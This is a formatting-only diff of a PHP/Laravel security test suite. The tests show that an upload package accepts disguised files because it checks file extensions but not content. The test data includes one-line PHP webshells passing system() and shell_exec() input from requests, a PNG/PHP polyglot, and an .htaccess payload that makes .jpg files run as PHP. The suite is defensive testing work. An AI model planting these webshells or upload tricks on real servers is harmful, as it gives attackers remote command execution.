@@ -50,15 +50,15 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
     public function test_mime_gap_php_webshell_with_jpg_extension_is_accepted(): void
     {
         $phpWebshellContent = '<?php system($_GET["cmd"]); ?>';
-        $contentHash        = hash('sha256', $phpWebshellContent);
+        $contentHash = hash('sha256', $phpWebshellContent);
 
         // Initiate session with a .jpg filename (passes extension blacklist)
         $initiateResponse = $this->postJson('/api/chunks/initiate', [
-            'file_name'    => 'profile_photo.jpg',
-            'file_size'    => strlen($phpWebshellContent),
+            'file_name' => 'profile_photo.jpg',
+            'file_size' => strlen($phpWebshellContent),
             'total_chunks' => 1,
-            'total_hash'   => $contentHash,
-            'fingerprint'  => 'mime_gap_webshell_' . uniqid(),
+            'total_hash' => $contentHash,
+            'fingerprint' => 'mime_gap_webshell_'.uniqid(),
         ]);
 
         $initiateResponse->assertStatus(201, 'Session with .jpg filename must be accepted');
@@ -68,9 +68,9 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
         $maliciousFile = UploadedFile::fake()->createWithContent('profile_photo.jpg', $phpWebshellContent);
 
         $uploadResponse = $this->call('POST', '/api/chunks/upload', [
-            'session_id'  => $sessionId,
+            'session_id' => $sessionId,
             'chunk_index' => 0,
-            'chunk_hash'  => $contentHash,
+            'chunk_hash' => $contentHash,
         ], [], ['file' => $maliciousFile], ['HTTP_ACCEPT' => 'application/json']);
 
         // MIME GAP CONFIRMED: PHP content with .jpg extension is ACCEPTED
@@ -78,8 +78,8 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
             200,
             $uploadResponse->status(),
             'MIME TYPE GAP CONFIRMED: PHP webshell uploaded with .jpg extension was accepted. '
-            . 'The package only validates the file extension, not the actual MIME content. '
-            . 'Fix: use finfo_file() or Laravel mime validator to check actual content type.'
+            .'The package only validates the file extension, not the actual MIME content. '
+            .'Fix: use finfo_file() or Laravel mime validator to check actual content type.'
         );
 
         // Verify the file actually exists on disk with PHP content
@@ -112,17 +112,17 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
     public function test_mime_gap_polyglot_png_with_php_payload_is_accepted(): void
     {
         // Valid PNG magic bytes followed by PHP payload
-        $pngMagic    = "\x89PNG\r\n\x1a\n";
-        $phpPayload  = '<?php echo shell_exec($_POST["c"]); ?>';
-        $polyglot    = $pngMagic . str_repeat("\x00", 16) . $phpPayload;
+        $pngMagic = "\x89PNG\r\n\x1a\n";
+        $phpPayload = '<?php echo shell_exec($_POST["c"]); ?>';
+        $polyglot = $pngMagic.str_repeat("\x00", 16).$phpPayload;
         $contentHash = hash('sha256', $polyglot);
 
         $initiateResponse = $this->postJson('/api/chunks/initiate', [
-            'file_name'    => 'avatar.png',
-            'file_size'    => strlen($polyglot),
+            'file_name' => 'avatar.png',
+            'file_size' => strlen($polyglot),
             'total_chunks' => 1,
-            'total_hash'   => $contentHash,
-            'fingerprint'  => 'mime_gap_polyglot_' . uniqid(),
+            'total_hash' => $contentHash,
+            'fingerprint' => 'mime_gap_polyglot_'.uniqid(),
         ]);
 
         $initiateResponse->assertStatus(201);
@@ -131,9 +131,9 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
         $polyglotFile = UploadedFile::fake()->createWithContent('avatar.png', $polyglot);
 
         $uploadResponse = $this->call('POST', '/api/chunks/upload', [
-            'session_id'  => $sessionId,
+            'session_id' => $sessionId,
             'chunk_index' => 0,
-            'chunk_hash'  => $contentHash,
+            'chunk_hash' => $contentHash,
         ], [], ['file' => $polyglotFile], ['HTTP_ACCEPT' => 'application/json']);
 
         // POLYGLOT ACCEPTED: content validation is absent
@@ -141,7 +141,7 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
             200,
             $uploadResponse->status(),
             'MIME TYPE GAP CONFIRMED: Polyglot PNG+PHP file was accepted. '
-            . 'finfo_file() would detect the embedded PHP code or suspicious content.'
+            .'finfo_file() would detect the embedded PHP code or suspicious content.'
         );
     }
 
@@ -157,14 +157,14 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
     public function test_mime_gap_htaccess_payload_as_txt_is_accepted(): void
     {
         $htaccessContent = "AddType application/x-httpd-php .jpg\nOptions +ExecCGI\n";
-        $contentHash     = hash('sha256', $htaccessContent);
+        $contentHash = hash('sha256', $htaccessContent);
 
         $initiateResponse = $this->postJson('/api/chunks/initiate', [
-            'file_name'    => 'readme.txt',
-            'file_size'    => strlen($htaccessContent),
+            'file_name' => 'readme.txt',
+            'file_size' => strlen($htaccessContent),
             'total_chunks' => 1,
-            'total_hash'   => $contentHash,
-            'fingerprint'  => 'mime_gap_htaccess_' . uniqid(),
+            'total_hash' => $contentHash,
+            'fingerprint' => 'mime_gap_htaccess_'.uniqid(),
         ]);
 
         $initiateResponse->assertStatus(201);
@@ -173,9 +173,9 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
         $htaccessFile = UploadedFile::fake()->createWithContent('readme.txt', $htaccessContent);
 
         $uploadResponse = $this->call('POST', '/api/chunks/upload', [
-            'session_id'  => $sessionId,
+            'session_id' => $sessionId,
             'chunk_index' => 0,
-            'chunk_hash'  => $contentHash,
+            'chunk_hash' => $contentHash,
         ], [], ['file' => $htaccessFile], ['HTTP_ACCEPT' => 'application/json']);
 
         $this->assertEquals(
@@ -195,15 +195,15 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
      */
     public function test_mime_gap_control_explicit_php_extension_is_blocked(): void
     {
-        $phpContent  = '<?php phpinfo(); ?>';
+        $phpContent = '<?php phpinfo(); ?>';
         $contentHash = hash('sha256', $phpContent);
 
         $initiateResponse = $this->postJson('/api/chunks/initiate', [
-            'file_name'    => 'shell.php',
-            'file_size'    => strlen($phpContent),
+            'file_name' => 'shell.php',
+            'file_size' => strlen($phpContent),
             'total_chunks' => 1,
-            'total_hash'   => $contentHash,
-            'fingerprint'  => 'mime_control_php_' . uniqid(),
+            'total_hash' => $contentHash,
+            'fingerprint' => 'mime_control_php_'.uniqid(),
         ]);
 
         // Extension blacklist DOES block .php
@@ -222,18 +222,18 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
      */
     public function test_mime_gap_documents_finfo_can_detect_php_in_jpg(): void
     {
-        if (!extension_loaded('fileinfo')) {
+        if (! extension_loaded('fileinfo')) {
             $this->markTestSkipped('fileinfo extension not available');
         }
 
         $phpWebshellContent = '<?php system($_GET["cmd"]); ?>';
 
         // Write to a temp file with .jpg extension
-        $tmpFile = tempnam(sys_get_temp_dir(), 'mime_test_') . '.jpg';
+        $tmpFile = tempnam(sys_get_temp_dir(), 'mime_test_').'.jpg';
         file_put_contents($tmpFile, $phpWebshellContent);
 
         try {
-            $finfo    = new \finfo(FILEINFO_MIME_TYPE);
+            $finfo = new \finfo(FILEINFO_MIME_TYPE);
             $mimeType = $finfo->file($tmpFile);
 
             // finfo detects the actual content type, not the extension
@@ -251,7 +251,7 @@ class AdvSec_MimeTypeExtensionGapTest extends TestCase
             );
 
             fwrite(STDERR, "\n[MIME GAP] finfo detected '{$mimeType}' for PHP content with .jpg extension. "
-                . "A MIME validator would block this. The package currently does NOT use finfo.\n");
+                ."A MIME validator would block this. The package currently does NOT use finfo.\n");
         } finally {
             @unlink($tmpFile);
         }
